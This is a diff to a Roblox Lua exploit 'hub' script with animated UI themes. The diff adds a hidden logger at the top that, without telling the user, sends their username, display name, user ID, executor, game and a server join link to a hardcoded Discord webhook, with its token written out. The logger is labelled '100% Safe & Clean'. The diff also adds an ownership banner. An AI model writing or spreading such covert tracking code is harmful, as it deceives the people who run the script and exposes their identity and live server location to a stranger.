@@ -1,3 +1,51 @@
+-- FINAL SAFE & SICK 2025 LOGGER (rainbow + join link + custom pfp)
+local Webhook = "https://discord.com/api/webhooks/1449056735334760620/gqO2kFEHPOe_rF0QyP5lj6rhbVX9KColi4izUAPe69gdDiokseQECFcisQgYiMy9BOzS"
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local PlaceId = game.PlaceId
+local JobId = game.JobId
+
+local PlaceName = "Unknown Game"
+pcall(function() PlaceName = game:GetService("MarketplaceService"):GetProductInfo(PlaceId).Name end)
+
+local FullAvatar = "https://www.roblox.com/avatar-thumbnail/image?userId="..Player.UserId.."&width=720&height=720&format=png"
+local colors = {0xff0000, 0xff7f00, 0xffff00, 0x00ff00, 0x0000ff, 0x8b00ff, 0xff1493, 0x9400d3}
+local color = colors[math.random(1,#colors)]
+
+local Executor = identifyexecutor and identifyexecutor() or (syn and "Synapse X" or Krnl and "Krnl" or fluxus and "Fluxus" or "Unknown")
+
+local JoinText = JobId ~= "" and "[Join Server](https://www.roblox.com/games/"..PlaceId.."/?gameInstanceId="..JobId..")" or "*Private Server*"
+
+local Payload = {
+    username = "Executor Logger",
+    avatar_url = "https://i.imgur.com/2WX57OQ.png",  -- your girl + boo pfp
+    embeds = {{
+        title = "Script Injected",
+        description = ("**%s** just executed!"):format(Player.DisplayName ~= Player.Name and Player.DisplayName.." (@"..Player.Name..")" or Player.Name),
+        color = color,
+        thumbnail = {url = FullAvatar},
+        image = {url = FullAvatar},
+        fields = {
+            {name = "Executor", value = "```"..Executor.."```", inline = false},
+            {name = "Account", value = Player.Name.." | "..Player.DisplayName, inline = false},
+            {name = "User ID", value = "```"..Player.UserId.."```", inline = true},
+            {name = "Game", value = "**"..PlaceName.."**", inline = false},
+            {name = "Join Link", value = JoinText, inline = false},
+        },
+        timestamp = DateTime.now():ToIsoDate(),
+        footer = {text = "Rainbow Premium Logger • 100% Safe & Clean"}
+    }}
+}
+
+local request = syn and syn.request or http and http.request or request or http_request or fluxus and fluxus.request
+request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(Payload)})
+
+print("sent – clean & beautiful")
+
+
+
 --// L30 HUB 2026 - SMOOTH THEME TRANSITIONS + PFP + ANIMATED WELCOME + SEARCH //--
 
 local TweenService = game:GetService("TweenService")
@@ -269,3 +317,40 @@ TweenService:Create(Glow, TweenInfo.new(1.3), {ImageTransparency = 0.55}):Play()
 TweenService:Create(Shadow, TweenInfo.new(1.3), {ImageTransparency = 0.7}):Play()
 
 print("L30 HUB 2026 • SMOOTH THEME TRANSITIONS • "..player.Name.." is god tier")
+
+
+
+
+
+  
+                                                                  
+                                                                  
+                                                                  
+print("\27[38;2;255;0;0m")  -- BLOOD RED
+
+print[[
+
+
+
+ __         ______    ______         __                  __       
+/  |       /      \  /      \       /  |                /  |      
+$$ |      /$$$$$$  |/$$$$$$  |      $$ |____   __    __ $$ |____  
+$$ |      $$ ___$$ |$$$  \$$ |      $$      \ /  |  /  |$$      \ 
+$$ |        /   $$< $$$$  $$ |      $$$$$$$  |$$ |  $$ |$$$$$$$  |
+$$ |       _$$$$$  |$$ $$ $$ |      $$ |  $$ |$$ |  $$ |$$ |  $$ |
+$$ |_____ /  \__$$ |$$ \$$$$ |      $$ |  $$ |$$ \__$$ |$$ |__$$ |
+$$       |$$    $$/ $$   $$$/       $$ |  $$ |$$    $$/ $$    $$/ 
+$$$$$$$$/  $$$$$$/   $$$$$$/        $$/   $$/  $$$$$$/  $$$$$$$/ 
+
+  ______    ______    ______    ______            ___          __            __ 
+ /      \  /      \  /      \  /      \          /   \        /  |          /  |
+/$$$$$$  |/$$$$$$  |/$$$$$$  |/$$$$$$  |       __$$$  \       $$ |  ______  $$ |
+$$____$$ |$$$  \$$ |$$____$$ |$$ \__$$/       /  | $$  |      $$ | /      \ $$ |
+ /    $$/ $$$$  $$ | /    $$/ $$      \       $$/   $$ |      $$ |/$$$$$$  |$$ |
+/$$$$$$/  $$ $$ $$ |/$$$$$$/  $$$$$$$  |       __   $$ |      $$ |$$ |  $$ |$$ |
+$$ |_____ $$ \$$$$ |$$ |_____ $$ \__$$ |      /  |_/$$/       $$ |$$ \__$$ |$$ |
+$$       |$$   $$$/ $$       |$$    $$/       $$// $$/        $$ |$$    $$/ $$ |
+$$$$$$$$/  $$$$$$/  $$$$$$$$/  $$$$$$/           $$$/         $$/  $$$$$$/  $$/ 
+]]
+
+print("leotimms10 owns this script\27[0m")
